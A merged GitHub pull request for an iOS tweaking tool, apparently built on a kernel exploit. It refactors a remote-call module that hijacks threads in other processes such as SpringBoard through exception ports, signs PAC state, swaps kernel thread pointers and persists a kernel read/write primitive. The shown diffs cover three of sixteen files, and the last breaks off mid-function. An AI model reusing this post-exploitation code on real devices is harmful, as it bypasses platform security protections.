# RemoteCall refactor, attempt to persist krw primitive, upside down tweak

> **Repository:** [rooootdev/lara](https://github.com/rooootdev/lara)  
> **Pull Request:** [#131](https://github.com/rooootdev/lara/pull/131)  
> **State:** 🟣 merged  
> **Branch:** `khanhduytran0:main` → `rooootdev:main`  
> **Merged by:** [@rooootdev](https://github.com/rooootdev) on Apr 19, 2026  
> **Changes:** +902 / -628 across 16 files  
> **Created:** Apr 19, 2026  
> **Updated:** Apr 19, 2026  
> **Closed:** Apr 19, 2026  

---

## Description

*Opened by [@khanhduytran0](https://github.com/khanhduytran0)* *on Apr 19, 2026*


I've changed RemoteCall to OOP to allow attaching to multiple processes simultaneously (might help EU Enabler and such I think which need hooking in multiple daemons). Added krw persistence so app does not have to re-exploit when you relaunch lara (it seems currently broken when I added it to lara, but works fine in darksword playground app, not sure why). Plus I replaced some functions that used to be depend on XPF to work without it. Now I think grabbing kernelcache and XPF is no longer needed (need more testing)

Also, some stuff are quite messy rn (we have `ourproc()`, then `proc_self()`, etc). Might clean it up later if I have time.

I haven't tested much so let me know if you have any issues.


👍 2


---

## Checks & Status

- Overall: 🟡 **pending**


---

## PR Commits (5)

- [`2c9e13b`](https://github.com/rooootdev/lara/commit/2c9e13bacf26eba8e2d9ab0f6680d28a0a90e62d) Refactor RemoteCall to OOP to allow attaching to multiple processes — *khanhduytran0* · Apr 19, 2026
- [`23a88d1`](https://github.com/rooootdev/lara/commit/23a88d10e07ef584b2303cdc4eb66fdab067703d) Replace offset-dependent functions with wh1te4ever's offsetless functions, add persistence — *khanhduytran0* · Apr 19, 2026
- [`423fd32`](https://github.com/rooootdev/lara/commit/423fd32ecb7515db4092ab8613ccfb9e00f101f5) Fix recover self proc when recovering krw — *khanhduytran0* · Apr 19, 2026
- [`5ea022e`](https://github.com/rooootdev/lara/commit/5ea022e98225059cedf5b96f72dfd81f12c72f93) Add kread validation in recover_krw_primitives — *khanhduytran0* · Apr 19, 2026
- [`56ebe41`](https://github.com/rooootdev/lara/commit/56ebe41b51578a77893ce3ecc28630c7bc4c3843) Add upsidedown tweak — *khanhduytran0* · Apr 19, 2026


---

## Changed Files (16)

- 🟡 `lara/classes/laramgr.swift` (modified) — +19 / -14
  <details><summary>Diff</summary>

  ```diff
  @@ -40,6 +40,8 @@ final class laramgr: ObservableObject {
     @Published var sbxfailed: Bool = false
     @Published var sbxrunning: Bool = false
     
+    var sbProc: RemoteCall?
+    
     static let shared = laramgr()
     static let fontpath = "/System/Library/Fonts/Core/SFUI.ttf"
     static let italicfontpath = "/System/Library/Fonts/Core/SFUIItalic.ttf"
@@ -466,11 +468,11 @@ final class laramgr: ObservableObject {
         logmsg("initializing remote call on \(process)...")
         
         DispatchQueue.global(qos: .userInitiated).async { [weak self] in
-            let result = init_remote_call(process, migbypass)
+            self?.sbProc = RemoteCall(process: process, useMigFilterBypass: migbypass)
             
             DispatchQueue.main.async {
                 guard let self = self else { return }
-                let success = result == 0
+                let success = self.sbProc != nil
                 if success {
                     self.logmsg("remote call initialized on \(process)")
                 } else {
@@ -489,7 +491,7 @@ final class laramgr: ObservableObject {
         remotecallrunning = false
         
         DispatchQueue.global(qos: .userInitiated).async { [weak self] in
-            destroy_remote_call()
+            self?.sbProc?.destroy()
             
             DispatchQueue.main.async {
                 self?.logmsg("remote call session destroyed")
@@ -500,22 +502,25 @@ final class laramgr: ObservableObject {
     
     //  params:
     //  - name: function to call
-    //  - args: up to 8 args (x0-x7)
+    //  - args: up to 8 args in registers (x0-x7) and extra args passed to stack pointer
     //  - timeout: timeout in ms
     //  ret: return value from rc
     func rccall(name: String, args: [UInt64] = [], timeout: Int32 = 100) -> UInt64 {
         guard remotecallrunning else { return 0 }
-        
-        var padded = args
-        while padded.count < 8 {
-            padded.append(0)
+        let RTLD_DEFAULT = UnsafeMutableRawPointer(bitPattern: -2)
+        let ptr = dlsym(RTLD_DEFAULT, name)
+        var argsCopy = args
+        return name.withCString { (cName: UnsafePointer<CChar>) -> UInt64 in
+            UInt64(argsCopy.withUnsafeMutableBufferPointer { buffer in
+                sbProc?.doStable(
+                    withTimeout: timeout,
+                    functionName: UnsafeMutablePointer(mutating: cName),
+                    functionPointer: ptr,
+                    args: buffer.baseAddress,
+                    argCount: UInt(args.count)
+                ) ?? 0
+            })
         }
-        
-        return do_remote_call_stable(
-            timeout, name,
-            padded[0], padded[1], padded[2], padded[3],
-            padded[4], padded[5], padded[6], padded[7]
-        )
     }
     #endif
 }
  ```

  </details>
- 🟡 `lara/kexploit/TaskRop/RemoteCall.h` (modified) — +102 / -23
  <details><summary>Diff</summary>

  ```diff
  @@ -9,9 +9,34 @@
 #ifndef RemoteCall_h
 #define RemoteCall_h
 
+@import Foundation;
 #import <mach/mach.h>
-#import <stdbool.h>
-#import <stdint.h>
+
+// xnu-10002.81.5/osfmk/kern/exc_guard.h
+#define EXC_GUARD_ENCODE_TYPE(code, type) \
+    ((code) |= (((uint64_t)(type) & 0x7ull) << 61))
+#define EXC_GUARD_ENCODE_FLAVOR(code, flavor) \
+    ((code) |= (((uint64_t)(flavor) & 0x1fffffffull) << 32))
+#define EXC_GUARD_ENCODE_TARGET(code, target) \
+    ((code) |= (((uint64_t)(target) & 0xffffffffull)))
+
+
+// xnu-10002.81.5/osfmk/mach/arm/_structs.h
+#define __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK 0xff000000
+#define __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR 0x2
+#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC 0x4
+#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR 0x8
+
+// from pe_main.js
+#define SHMEM_CACHE_SIZE                100
+#define FAKE_PC_TROJAN_CREATOR          0x101
+#define FAKE_LR_TROJAN_CREATOR          0x201
+#define FAKE_PC_TROJAN                  0x301
+#define FAKE_LR_TROJAN                  0x401
+
+// from https://github.com/nickingravallo/Machium/blob/main/Machium/Breakpoint.h
+#define BREAKPOINT_ENABLE 481
+#define BREAKPOINT_DISABLE 0
 
 struct VMShmem {
     uint64_t port;
@@ -32,33 +57,87 @@ typedef struct {
     uint32_t __flags; /* Flags describing structure format */
 } arm_thread_state64_internal;
 
-// Exception port creation
 mach_port_t create_exception_port(void);
+int disable_excguard_kill(uint64_t task);
+//int init_remote_call(const char* process, bool useMigFilterBypass);
+//uint64_t do_remote_call_stable(int timeout, const char *name, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7);
+//void sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint64_t pc, uint64_t lr);
+uint64_t remote_pac(uint64_t remoteThreadAddr, uint64_t address, uint64_t modifier);
+//bool remote_read(uint64_t src, void *dst, uint64_t size);
+//void remote_hexdump(uint64_t remoteAddr, size_t size);
+//bool remote_writeStr(uint64_t dst, const char *str);
+//int destroy_remote_call(void);
 
-// Remote call initialization and cleanup
-int init_remote_call(const char* process, bool useMigFilterBypass);
-int destroy_remote_call(void);
+@class RemotePointer;
+@interface RemoteCall : NSObject {
+    uint64_t _taskAddr;
+    bool _creatingExtraThread;
+    mach_port_t _firstExceptionPort;
+    mach_port_t _secondExceptionPort;
+    uint64_t _firstExceptionPortAddr;
+    uint64_t _secondExceptionPortAddr;
+    pthread_t _dummyThread;
+    mach_port_t _dummyThreadMach;
+    uint64_t _dummyThreadAddr;
+    uint64_t _dummyThreadTro;
+    uint64_t _selfThreadAddr;
+    uint32_t _selfThreadCtid;
+    arm_thread_state64_internal _originalState;
+    uint64_t _vmMap;
+    uint64_t _callThreadAddr;
+    uint64_t _trojanThreadAddr;
+    int _pid;
+    bool _success; // = true;
+    //NSMutableArray<NSNumber *> *_threadList = nil;
+    //uint64_t _trojanMem;
+    struct VMShmem _shmemCache[SHMEM_CACHE_SIZE];
+}
 
-// Remote function execution
-uint64_t do_remote_call_stable(int timeout, const char *name,
-    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
-    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7);
+@property(nonatomic) NSMutableArray<NSNumber *> *threadList;
+@property(nonatomic) uint64_t trojanMem;
 
-// PAC signing
-void sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint64_t pc, uint64_t lr);
-uint64_t remote_pac(uint64_t remoteThreadAddr, uint64_t address, uint64_t modifier);
+- (NSUInteger)doRemoteCallStableWithTimeout:(int)timeout functionName:(char *)name functionPointer:(void *)ptr
+                            args:(uint64_t *)args argCount:(NSUInteger)argCount;
+- (int)destroyRemoteCall;
+- (BOOL)remoteRead:(uint64_t)src to:(void *)dst size:(uint64_t)size;
+- (uint64_t)remoteRead64From:(uint64_t)src;
+- (void)remoteHexdumpFrom:(uint64_t)remoteAddr size:(size_t)size;
+- (BOOL)remote_write:(uint64_t)dst from:(const void *)src size:(uint64_t)size;
+- (BOOL)remote_write64:(uint64_t)dst value:(uint64_t)val;
+- (BOOL)remote_write:(uint64_t)dst string:(const char *)str;
+- (instancetype)initWithProcess:(NSString *)process useMigFilterBypass:(BOOL)useMigFilterBypass;
+- (RemotePointer *)objectAtIndexedSubscript:(uint64_t)address;
+
+@end
+
+@interface RemotePointer : NSObject
+@property(nonatomic, readonly) RemoteCall *remoteCall;
+@property(nonatomic, readonly) NSUInteger address;
+
+- (instancetype)initWithRemoteCall:(RemoteCall *)remoteCall address:(NSUInteger)address;
+
+- (void)setString:(NSString *)string;
+- (void)setValue8:(uint8_t)val;
+- (void)setValue16:(uint16_t)val;
+- (void)setValue32:(uint32_t)val;
+- (void)setValue64:(uint64_t)val;
+- (NSString *)string;
+- (uint8_t)value8;
+- (uint16_t)value16;
+- (uint32_t)value32;
+- (uint64_t)value64;
+@end
 
-// Remote memory operations
-bool remote_read(uint64_t src, void *dst, uint64_t size);
-bool remote_write(uint64_t dst, const void *src, uint64_t size);
-bool remote_writeStr(uint64_t dst, const char *str);
-void remote_hexdump(uint64_t remoteAddr, size_t size);
+#define RemoteArbCallTempWithTimeout(timeout, instance, _pc, ...) [instance doRemoteCallTempWithTimeout:timeout functionName:(char *)#_pc functionPointer:(void *)(_pc) args:(uint64_t[]){__VA_ARGS__} argCount:sizeof((uint64_t[]){__VA_ARGS__})/sizeof(uint64_t)]
+#define RemoteArbCallWithTimeout(timeout, instance, _pc, ...) [instance doRemoteCallStableWithTimeout:timeout functionName:(char *)#_pc functionPointer:(void *)(_pc) args:(uint64_t[]){__VA_ARGS__} argCount:sizeof((uint64_t[]){__VA_ARGS__})/sizeof(uint64_t)]
+#define RemoteArbCall(instance, _pc, ...) RemoteArbCallWithTimeout(5, instance, _pc, __VA_ARGS__)
 
 // SpringBoard tweaks
-void status_bar_tweak(void);
-int hide_icon_labels(void);
-int enable_jit(const char *bundleID);
-int set_dock_icon_count(int count);
-int five_icon_dock(void);
+void status_bar_tweak(RemoteCall *proc);
+int hide_icon_labels(RemoteCall *proc);
+int enable_jit(RemoteCall *proc, const char *bundleID);
+int set_dock_icon_count(RemoteCall *proc, int count);
+int five_icon_dock(RemoteCall *proc);
+int enable_upside_down(RemoteCall *proc);
 
 #endif /* RemoteCall_h */
  ```

  </details>
- 🟡 `lara/kexploit/TaskRop/RemoteCall.m` (modified) — +474 / -402
  <details><summary>Diff</summary>

  ```diff
  @@ -23,32 +23,7 @@
 #import "../offsets.h"
 #import "../darksword.h"
 #import "../utils.h"
-
-// xnu-10002.81.5/osfmk/kern/exc_guard.h
-#define EXC_GUARD_ENCODE_TYPE(code, type) \
-    ((code) |= (((uint64_t)(type) & 0x7ull) << 61))
-#define EXC_GUARD_ENCODE_FLAVOR(code, flavor) \
-    ((code) |= (((uint64_t)(flavor) & 0x1fffffffull) << 32))
-#define EXC_GUARD_ENCODE_TARGET(code, target) \
-    ((code) |= (((uint64_t)(target) & 0xffffffffull)))
-
-// xnu-10002.81.5/osfmk/mach/arm/_structs.h
-#define __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK 0xff000000
-#define __DARWIN_ARM_THREAD_STATE64_FLAGS_NO_PTRAUTH     0x1
-#define __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR   0x2
-#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC 0x4
-#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR 0x8
-
-// from pe_main.js
-#define SHMEM_CACHE_SIZE                100
-#define FAKE_PC_TROJAN_CREATOR          0x101
-#define FAKE_LR_TROJAN_CREATOR          0x201
-#define FAKE_PC_TROJAN                  0x301
-#define FAKE_LR_TROJAN                  0x401
-
-// from https://github.com/nickingravallo/Machium/blob/main/Machium/Breakpoint.h
-#define BREAKPOINT_ENABLE 481
-#define BREAKPOINT_DISABLE 0
+@import ObjectiveC;
 
 static bool g_mig_bypass_enabled = false;
 
@@ -68,32 +43,11 @@ void mig_bypass_pause(void) {
 void mig_bypass_monitor_threads(uint64_t thread1, uint64_t thread2) {
 }
 
-uint64_t g_RC_taskAddr;
-bool g_RC_creatingExtraThread;
-mach_port_t g_RC_firstExceptionPort;
-mach_port_t g_RC_secondExceptionPort;
-uint64_t g_RC_firstExceptionPortAddr;
-uint64_t g_RC_secondExceptionPortAddr;
-pthread_t g_RC_dummyThread;
-mach_port_t g_RC_dummyThreadMach;
-uint64_t g_RC_dummyThreadAddr;
-uint64_t g_RC_dummyThreadTro;
-uint64_t g_RC_selfThreadAddr;
-uint32_t g_RC_selfThreadCtid;
-arm_thread_state64_internal g_RC_originalState;
-uint64_t g_RC_vmMap;
-uint64_t g_RC_callThreadAddr;
-uint64_t g_RC_trojanThreadAddr;
-int g_RC_pid;
-bool g_RC_success = true;
-
-NSMutableArray<NSNumber *> *g_RC_threadList = nil;
-uint64_t g_RC_trojanMem = 0;
-struct VMShmem g_RC_shmemCache[SHMEM_CACHE_SIZE];
-
-bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread, bool useMigFilterBypass) {
+
+@implementation RemoteCall
+//bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread, bool useMigFilterBypass) {
+- (BOOL)setExceptionPortOnThread:(mach_port_t)exceptionPort forThread:(uint64_t)currThread useMigFilterBypass:(BOOL)useMigFilterBypass {
     bool success = false;
-    
     void* thread_set_exception_ports_addr = dlsym(RTLD_DEFAULT, "thread_set_exception_ports");
     void* pthread_exit_addr = dlsym(RTLD_DEFAULT, "pthread_exit");
     
@@ -105,7 +59,7 @@ bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread
     uint64_t machThreadAddr = task_get_ipc_port_kobject(task_self(), machThread);
 
     if(useMigFilterBypass) {
-        mig_bypass_monitor_threads(g_RC_selfThreadAddr, machThreadAddr);
+        mig_bypass_monitor_threads(_selfThreadAddr, machThreadAddr);
     }
 
     arm_thread_state64_internal state;
@@ -119,7 +73,7 @@ bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread
     arm_thread_state64_set_pc_fptr(state, thread_set_exception_ports_addr);
     arm_thread_state64_set_lr_fptr(state, pthread_exit_addr);
     
-    state.__x[0] = g_RC_dummyThreadMach;
+    state.__x[0] = _dummyThreadMach;
     state.__x[1] = EXC_MASK_GUARD | EXC_MASK_BAD_ACCESS;
     state.__x[2] = exceptionPort;
     state.__x[3] = EXCEPTION_STATE | MACH_EXCEPTION_CODES;
@@ -135,7 +89,7 @@ bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread
     if(useMigFilterBypass)
         usleep(100000);
     
-    thread_set_mutex(g_RC_dummyThreadAddr, g_RC_selfThreadCtid);
+    thread_set_mutex(_dummyThreadAddr, _selfThreadCtid);
     
     if (!thread_resume_wrapper(machThread))
         return false;
@@ -167,7 +121,7 @@ bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread
         memset(dataBuff, 0, 0x1000);
         kreadbuf(pageBase, &dataBuff, 0x1000);
 
-        uint64_t needleVal = g_RC_dummyThreadTro;
+        uint64_t needleVal = _dummyThreadTro;
         void *match = memmem(dataBuff, 0x1000, &needleVal, sizeof(needleVal));
         if (!match) {
             printf("[%s:%d] [iter %d] Couldn't find g_RC_dummyThreadTro=0x%llx in pageBase=0x%llx\n", __FUNCTION__, __LINE__, i, needleVal, pageBase);
@@ -199,7 +153,7 @@ bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread
         }
         
         if (found && correctTro) {
-            if (thread_get_task(currThread) == g_RC_taskAddr) {
+            if (thread_get_task(currThread) == _taskAddr) {
                 uint64_t tro = thread_get_t_tro(currThread);
                 uint64_t swapAddr = trunc_page(kernelSP) + found;
                 printf("[%s:%d] [iter %d] TRO swap: writing target tro=0x%llx to addr=0x%llx\n", __FUNCTION__, __LINE__, i, tro, swapAddr);
@@ -221,17 +175,18 @@ bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread
     printf("[%s:%d] set_exception_port_on_thread returning success=%d\n", __FUNCTION__, __LINE__, success);
     fflush(stdout);
     
-    thread_set_mutex(g_RC_dummyThreadAddr, 0x40000000);
+    thread_set_mutex(_dummyThreadAddr, 0x40000000);
     
-    thread_set_exception_ports(g_RC_dummyThreadMach, 0, exceptionPort, EXCEPTION_STATE | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
+    thread_set_exception_ports(_dummyThreadMach, 0, exceptionPort, EXCEPTION_STATE | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
     
     if(useMigFilterBypass)
         usleep(100000);
 
     return success;
 }
 
-void sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint64_t pc, uint64_t lr)
+//void sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint64_t pc, uint64_t lr)
+- (void)signState:(uint64_t)signingThread withState:(arm_thread_state64_internal *)state pc:(uint64_t)pc lr:(uint64_t)lr
 {
     if(is_pac_supported()) {
         uint64_t diver = 0;
@@ -261,37 +216,64 @@ void sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint
     }
 }
 
-uint64_t do_remote_call_temp(int timeout, const char *name,
-    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
-    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
+//uint64_t do_remote_call_temp(int timeout, const char *name,
+//                             uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
+//                             uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
+- (NSUInteger)doRemoteCallTempWithTimeout:(int)timeout functionName:(char *)name functionPointer:(void*)ptr
+                                     args:(uint64_t *)args argCount:(NSUInteger)argCount
+{
+    return [self doRemoteCallInternalTimeout:timeout exceptionPort:_firstExceptionPort
+                                                 lrMarker:FAKE_LR_TROJAN_CREATOR functionName:name functionPointer:ptr args:args argCount:argCount];
+}
+
+//uint64_t do_remote_call_stable(int timeout, const char *name,
+//                               uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
+//                               uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
+- (NSUInteger)doRemoteCallStableWithTimeout:(int)timeout functionName:(char *)name functionPointer:(void*)pcAddr
+                            args:(uint64_t *)args argCount:(NSUInteger)argCount
+{
+    if (!_creatingExtraThread)
+        //return do_remote_call_temp(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
+        return [self doRemoteCallTempWithTimeout:timeout functionName:name functionPointer:pcAddr args:args argCount:argCount];
+    return [self doRemoteCallInternalTimeout:timeout exceptionPort:_secondExceptionPort lrMarker:FAKE_LR_TROJAN
+                                functionName:name functionPointer:pcAddr args:args argCount:argCount];
+}
+
+//uint64_t do_remote_call_temp(int timeout, const char *name,
+//                             uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
+//                             uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
+- (NSUInteger)doRemoteCallInternalTimeout:(int)timeout exceptionPort:(mach_port_t)exceptionPort
+                                 lrMarker:(uint64_t)lrMarker
+                             functionName:(char *)name functionPointer:(void*)ptr
+                                     args:(uint64_t *)args argCount:(NSUInteger)argCount
 {
-    printf("[%s:%d] Calling %s\n", __FUNCTION__, __LINE__, name);
-    fflush(stdout);
-    
     int newTimeout = (10000 > timeout) ? 10000 : timeout;
-    uint64_t pcAddr = native_strip((uint64_t)dlsym(RTLD_DEFAULT, name));
+    uint64_t pcAddr = native_strip((uint64_t)ptr);
     printf("[%s:%d] pcAddr for %s: 0x%llx\n", __FUNCTION__, __LINE__, name, pcAddr);
     fflush(stdout);
+    BOOL isTempCall = (exceptionPort == _firstExceptionPort);
 
     ExceptionMessage exc;
     printf("[%s:%d] Waiting for exception...\n", __FUNCTION__, __LINE__);
     fflush(stdout);
-    if (!wait_exception(g_RC_firstExceptionPort, &exc, newTimeout, false)) {
-        printf("[%s:%d] Don't receive first exception on original thread\n", __FUNCTION__, __LINE__);
+    const char *threadStr = isTempCall ? "original" : "new";
+    if (!wait_exception(exceptionPort, &exc, newTimeout, false)) {
+        printf("[%s:%d] Don't receive first exception on %s thread\n", __FUNCTION__, __LINE__, threadStr);
         return 0;
     }
     printf("[%s:%d] Exception received, setting up args and replying\n", __FUNCTION__, __LINE__);
     fflush(stdout);
 
-    exc.threadState.__x[0] = x0;
-    exc.threadState.__x[1] = x1;
-    exc.threadState.__x[2] = x2;
-    exc.threadState.__x[3] = x3;
-    exc.threadState.__x[4] = x4;
-    exc.threadState.__x[5] = x5;
-    exc.threadState.__x[6] = x6;
-    exc.threadState.__x[7] = x7;
-    sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN_CREATOR);
+    if (argCount > 8) {
+        uint64_t sp = native_strip(exc.threadState.__sp);
+        for (int i = 8; i < argCount; i++) {
+            self[sp + sizeof(uint64_t[i-8])].value64 = args[i];
+            argCount = 8;
+        }
+    }
+    memcpy(&exc.threadState.__x[0], args, argCount * sizeof(uint64_t));
+    bzero(&exc.threadState.__x[argCount], (8 - argCount) * sizeof(uint64_t));
+    [self signState:_trojanThreadAddr withState:&exc.threadState pc:pcAddr lr:lrMarker];
     reply_with_state(&exc, &exc.threadState);
 
     if (timeout < 0) {
@@ -300,136 +282,101 @@ uint64_t do_remote_call_temp(int timeout, const char *name,
     }
 
     ExceptionMessage exc2;
-    if (!wait_exception(g_RC_firstExceptionPort, &exc2, newTimeout, false)) {
-        printf("[%s:%d] Don't receive second exception on original thread\n", __FUNCTION__, __LINE__);
+    if (!wait_exception(exceptionPort, &exc2, newTimeout, false)) {
+        printf("[%s:%d] Don't receive second exception on %s thread\n", __FUNCTION__, __LINE__, threadStr);
         return 0;
     }
     uint64_t retValue = exc2.threadState.__x[0];
     reply_with_state(&exc2, &exc2.threadState);
     printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name, retValue, retValue);
-    if(strcmp(name, "getpid") == 0 && retValue == 0) {
+    if(isTempCall && strcmp(name, "getpid") == 0 && retValue == 0) {
         printf("[%s:%d] getpid failed\n", __FUNCTION__, __LINE__);
         printf("[%s:%d] spinning here...\n", __FUNCTION__, __LINE__);
-        while(1) {};
+        while(1) { sleep(1); };
     }
     return retValue;
 }
 
-uint64_t do_remote_call_stable(int timeout, const char *name,
-    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
-    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
+//bool restore_trojan_thread(arm_thread_state64_internal *state)
+- (BOOL)restoreTrojanThreadWithState:(arm_thread_state64_internal *)state
 {
-    if (!g_RC_creatingExtraThread)
-        return do_remote_call_temp(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
-
-    uint64_t pcAddr = (uint64_t)dlsym(RTLD_DEFAULT, name);
-    if (!pcAddr) {
-        printf("[%s:%d] Unable to find symbol: %s\n", __FUNCTION__, __LINE__, name);
-        return 0;
-    }
-    int newTimeout = (10000 > timeout) ? 10000 : timeout;
-
     ExceptionMessage exc;
-    if (!wait_exception(g_RC_secondExceptionPort, &exc, newTimeout, false)) {
-        printf("[%s:%d] Don't receive first exception on new thread\n", __FUNCTION__, __LINE__);
-        return 0;
-    }
-
-    exc.threadState.__x[0] = x0;
-    exc.threadState.__x[1] = x1;
-    exc.threadState.__x[2] = x2;
-    exc.threadState.__x[3] = x3;
-    exc.threadState.__x[4] = x4;
-    exc.threadState.__x[5] = x5;
-    exc.threadState.__x[6] = x6;
-    exc.threadState.__x[7] = x7;
-    sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN);
-    reply_with_state(&exc, &exc.threadState);
-
-    if (timeout < 0) {
-        printf("[%s:%d] Trojan thread cleanup\n", __FUNCTION__, __LINE__);
-        return 0;
-    }
-
-    ExceptionMessage exc2;
-    if (!wait_exception(g_RC_secondExceptionPort, &exc2, newTimeout, false)) {
-        printf("[%s:%d] Don't receive second exception on new thread\n", __FUNCTION__, __LINE__);
-        return 0;
-    }
-    uint64_t retValue = exc2.threadState.__x[0];
-    reply_with_state(&exc2, &exc2.threadState);
-    printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name, retValue, retValue);
-    return retValue;
-}
-
-bool restore_trojan_thread(arm_thread_state64_internal *state)
-{
-    ExceptionMessage exc;
-    if (!wait_exception(g_RC_firstExceptionPort, &exc, 20000, false)) {
+    if (!wait_exception(_firstExceptionPort, &exc, 20000, false)) {
         printf("[%s:%d] Failed to receive exception while restoring\n", __FUNCTION__, __LINE__);
         return false;
     }
     
     state->__flags = exc.threadState.__flags;
-    sign_state(g_RC_trojanThreadAddr, state, state->__pc, state->__lr);
+    [self signState:_trojanThreadAddr withState:state pc:state->__pc lr:state->__lr];
     reply_with_state(&exc, state);
     return true;
 }
 
-int destroy_remote_call(void) {
-    if (g_RC_trojanMem) {
-        do_remote_call_stable(100, "munmap", g_RC_trojanMem, PAGE_SIZE, 0, 0, 0, 0, 0, 0);
+//int destroy_remote_call(void) {
+- (int)destroyRemoteCall {
+    if (_trojanMem) {
+        RemoteArbCallWithTimeout(100, self, munmap, _trojanMem, PAGE_SIZE);
+        _trojanMem = 0;
+    } else {
+        return 0;
     }
-    if (g_RC_creatingExtraThread) {
-        do_remote_call_stable(-1, "pthread_exit", 0, 0, 0, 0, 0, 0, 0, 0);
+    if (_creatingExtraThread) {
+        RemoteArbCallWithTimeout(-1, self, pthread_exit, 0);
     }
     else {
-        restore_trojan_thread(&g_RC_originalState);
+        [self restoreTrojanThreadWithState:&_originalState];
     }
 
-    mach_port_destruct(mach_task_self_, g_RC_firstExceptionPort, 0, 0);
-    mach_port_destruct(mach_task_self_, g_RC_secondExceptionPort, 0, 0);
-    pthread_cancel(g_RC_dummyThread);
+    mach_port_destruct(mach_task_self_, _firstExceptionPort, 0, 0);
+    mach_port_destruct(mach_task_self_, _secondExceptionPort, 0, 0);
+    pthread_cancel(_dummyThread);
     
-    g_RC_threadList = [NSMutableArray new];
+    self.threadList = [NSMutableArray new];
     
     return 0;
 }
+- (void)dealloc {
+    [self destroyRemoteCall];
+}
 
-struct VMShmem *get_shmem_from_cache(uint64_t pageAddr)
+//struct VMShmem *get_shmem_from_cache(uint64_t pageAddr)
+- (struct VMShmem *)getShmemFromCache:(uint64_t)pageAddr
 {
     for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
-        if (g_RC_shmemCache[i].used && g_RC_shmemCache[i].remoteAddress == pageAddr)
-            return &g_RC_shmemCache[i];
+        if (_shmemCache[i].used && _shmemCache[i].remoteAddress == pageAddr)
+            return &_shmemCache[i];
     }
     return NULL;
 }
 
-struct VMShmem *put_shmem_in_cache(struct VMShmem *shmem)
+//struct VMShmem *put_shmem_in_cache(struct VMShmem *shmem)
+- (struct VMShmem *)putShmemInCache:(struct VMShmem *)shmem
 {
     for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
-        if (!g_RC_shmemCache[i].used) {
-            g_RC_shmemCache[i] = *shmem;
-            g_RC_shmemCache[i].used = true;
-            return &g_RC_shmemCache[i];
+        if (!_shmemCache[i].used) {
+            _shmemCache[i] = *shmem;
+            _shmemCache[i].used = true;
+            return &_shmemCache[i];
         }
     }
     printf("[%s:%d] g_RC_shmemCache full\n", __FUNCTION__, __LINE__);
     return NULL;
 }
 
-struct VMShmem *get_shmem_for_page(uint64_t pageAddr)
+//struct VMShmem *get_shmem_for_page(uint64_t pageAddr)
+- (struct VMShmem *)get_shmemForPage:(uint64_t)pageAddr
 {
-    struct VMShmem *cached = get_shmem_from_cache(pageAddr);
+    struct VMShmem *cached = [self getShmemFromCache:pageAddr];
     if (cached) return cached;
 
-    struct VMShmem newShmem = vm_map_remote_page(g_RC_vmMap, pageAddr);
+    struct VMShmem newShmem = vm_map_remote_page(_vmMap, pageAddr);
     if (!newShmem.localAddress)
             return NULL;
-    return put_shmem_in_cache(&newShmem);
+    return [self putShmemInCache:&newShmem];
 }
 
-bool remote_read(uint64_t src, void *dst, uint64_t size)
+//bool remote_read(uint64_t src, void *dst, uint64_t size)
+- (BOOL)remoteRead:(uint64_t)src to:(void *)dst size:(uint64_t)size
 {
     if (!src || !dst || !size) return false;
     uint64_t dstAddr = (uint64_t)(uintptr_t)dst;
@@ -442,7 +389,7 @@ bool remote_read(uint64_t src, void *dst, uint64_t size)
         uint64_t copyCount = (roundUp - src < remaining) ? (roundUp - src) : remaining;
         uint64_t pageAddr  = src & ~PAGE_MASK;
 
-        struct VMShmem *page = get_shmem_for_page(pageAddr);
+        struct VMShmem *page = [self get_shmemForPage:pageAddr];
         if (!page) {
             printf("[%s:%d] remote_read failed: unable to find remote page\n", __FUNCTION__, __LINE__);
             return false;
